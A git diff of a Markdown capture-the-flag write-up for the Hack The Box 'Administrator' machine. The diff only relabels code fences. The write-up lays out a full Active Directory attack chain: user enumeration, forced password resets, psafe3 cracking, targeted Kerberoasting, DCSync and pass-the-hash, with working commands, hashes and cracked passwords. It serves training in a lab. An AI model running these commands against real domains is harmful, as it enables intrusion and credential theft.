@@ -19,7 +19,7 @@ Tags: #windows #AD #AssumedBreach  #Kerberoasting  #DCsync #OSCPpath
 ### Nmap scan
 
 #### command
-```
+```shell
 nmap -sSCV 10.10.11.42
 ```
 #### usage breakdown
@@ -29,7 +29,7 @@ the -sSCV parameter performs:
 	`-sV`** → **Version Detection**
 	
 #### Output
-```
+```shell
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 17:28 EDT
 Nmap scan report for 10.10.11.42
 Host is up (0.048s latency).
@@ -67,7 +67,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 21.78 seconds
 ```
 ###### Add machine to etc hosts
-```
+```shell
 echo '10.10.11.42 Administrator.htb' | sudo tee -a /etc/hosts
 ```
 
@@ -85,7 +85,7 @@ narrator: no, no don't give up yet, its too early (try giving up later xd)
 
 We are given (from the machine's description) creds for an account on that host, so lets use crackmapexec since smb service is available according to our nmap scan to enumerate the smb service
 
-```
+```shell
 crackmapexec smb Administrator.htb -u "Olivia" -p "ichliebedich" --rid-brute | grep SidTypeUser
 ```
 #### usage breakdown:
@@ -102,7 +102,7 @@ This is used to "filter" only the user accounts on our command's output, and not
 
 so the output we get looks sth like this, as we can see Olivia can login to winrm (in contrast with ftp)
 -> what we actually see here, is that the domain is  the ```administrator.htb```, along with every user and their respective RID
-```
+```shell
 SMB    administrator.htb 445    DC     500: ADMINISTRATOR\Administrator (SidTypeUser)
 SMB    administrator.htb 445    DC     501: ADMINISTRATOR\Guest (SidTypeUser)
 SMB    administrator.htb 445    DC     502: ADMINISTRATOR\krbtgt (SidTypeUser)
@@ -121,7 +121,7 @@ SMB    administrator.htb 445    DC     3602: ADMINISTRATOR\emma (SidTypeUser)
 
 So, earlier we found the users, but we also need to collect (more) AD data from a domain controller (which is yet unknown) in a given domain (administrator.htb)
 #### command
-```
+```shell
 bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 10.10.11.42
 ```
 #### usage breakdown:
@@ -132,7 +132,7 @@ bloodhound-python -u Olivia -p 'ichliebedich' -c All -d administrator.htb -ns 10
 	
 -> overall, we login to the given domain with the given creds for an account, collect AD data (users, groups, computers, permissions, ACLs, etc.), use the machine's IP as the DNS server to resolve the DC's IP and lastly save the data in json format, which can later be imported to BloodHound for visualization.
 #### output
-```
+```shell
 INFO: Found AD domain: administrator.htb
 INFO: Getting TGT for user
 WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
@@ -152,7 +152,7 @@ INFO: Querying computer: dc.administrator.htb
 INFO: Done in 00M 11S
 ```
 ###### add the DC to etc hosts
-```
+```shell
 echo '10.10.11.42 Administrator.htb dc.administrator.htb' | sudo tee -a /etc/hosts
 ```
 
@@ -179,12 +179,12 @@ As we can see in the pics above, we reach to the conclusion that Olivia has **Ge
 
 #### Step 1: Change Michael's Password (Olivia -> Michael)
 Use Olivia's account to change Michael's pass
-```
+```shell
 bloodyad --host "10.10.11.42" -d "Administrator.htb" -u "olivia" -p "ichliebedich" set password "michael" "TheBestPasswordYouHaveEverSeenOrHeard"
 ```
 #### Step 2: Change Benjamin's Password (Michael -> Benjamin)
 Use Michael's account (with the new pass we set earlier) to change Benjamin's pass
-```
+```shell
 bloodyad --host "10.10.11.42" -d "Administrator.htb" -u "michael" -p "TheBestPasswordYouHaveEverSeen" set password "TheSecondBestPasswordYouHaveEverSeenOrHeard"
 ```
 
@@ -203,44 +203,44 @@ after inspection through his AD permissions it appears that he has NO permission
 ### Log in to FTP as Benjamin
 
 connect
-```
+```shell
 ftp administrator.htb
 ```
 insert creds
-```
+```shell
 user: Benjamin
 pass: "TheSecondBestPasswordYouHaveEverSeenOrHeard"
 ```
 run ftp commands
-```
+```shell
 ls
 ```
 we see this, appears to be some backup file
-```
+```shell
 Backup.psafe3
 ```
 lets download it locally, then we can exit, nothing further valuable found
-```
+```shell
 get Backup.psafe3
 ```
 
 ##### What is a psafe3 file?
 These kind of files are encrypted password safe files! 
 used by PasswordSafe app (https://passwordsafe.app/), so obviously it cant be read in this form, we must use a tool to obtain hash from it, i chose **pwsafe2john** tool
-```
+```shell
 pwsafe2john Backup.psafe3 
 ```
 we get the following hash:
-```
+```shell
 Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
 ```
 ##### lets decrypt the obtained hash using johntheripper
 lets try using the most commonly used wordlist "rockyou" and see what we get 
-```
+```shell
 john psafe3hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 the decryption is successful, and we get the following pass:
-```
+```shell
 tekieromucho
 ```
 
@@ -251,17 +251,17 @@ To sum up shortly, we got:
 - The password that unlocks it
 
 -> so now we can install the app on our attacker machine, and open the .psafe3 file using the obtained pass, then we get the 3 user's passwords
-```
+```shell
 alexander
 UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
 ```
 
-```
+```shell
 emily
 UXLCI5iETUsIBoFVTj8yQFKoHjXmb
 ```
 
-```
+```shell
 emma
 WwANQWnmJnGV07WQN8bMS7FMAbjNur
 ```
@@ -273,11 +273,11 @@ Since we have the passwords for 3 users, we should figure out how to login to th
 By looking again at the results of the nmap scan we performed initially, we see open port 5985, and this only means one thing: **WinRM**
 
 Lets try to connect to emily user on the target host using winrm:
-```
+```shell
 evil-winrm -i Administrator.htb -u emily -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"
 ```
 After some inspection, we see that we can grab the user flag from emily's Desktop folder
-```
+```shell
 type \Desktop\user.txt
 ```
 
@@ -300,11 +300,11 @@ It must be noted that A **domain user** can request **ANY service ticket**.
 
 we will use this python script, which speeds up the process of kerberoasting attack 
 https://github.com/ShutdownRepo/targetedKerberoast
-```
+```shell
 python targetedKerberoast.py -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -d "Administrator.htb" --dc-ip 10.10.11.42
 ```
 and we get ethan's hash
-```
+```shell
 [*] Starting kerberoast attacks
 [*] Fetching usernames from Active Directory with LDAP
 [+] Printing hash for (ethan)
@@ -312,11 +312,11 @@ $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$15ec7606ffa3297b86
 ```
 
 ##### decrypt the obtained ethan's hash
-```
+```shell
 john ethanhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 and we get the pass:
-```
+```shell
 limpbizkit
 ```
 so now that we have another user's pass, lets repeat the process we did before, by checking this user's permissions over other users
@@ -347,20 +347,20 @@ For this attack, we are going to use **impacket-secretsdump** for the following 
 # Privesc
 
 So, with the aforementioned tool using ethan's creds:
-```
+```shell
 impacket-secretsdump "Administrator.htb/ethan:limpbizkit"@"dc.Administrator.htb"
 ```
 we obtain Administrator's hash
-```
+```shell
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
 ```
 
 then, we follow the standard procedure, via evil-winrm to login to user Administrator with the hash
-```
+```shell
 evil-winrm -i administrator.htb -u administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"
 ```
 finally we get the root flag!
-```
+```shell
 type \Desktop\ root.txt
 ```
 
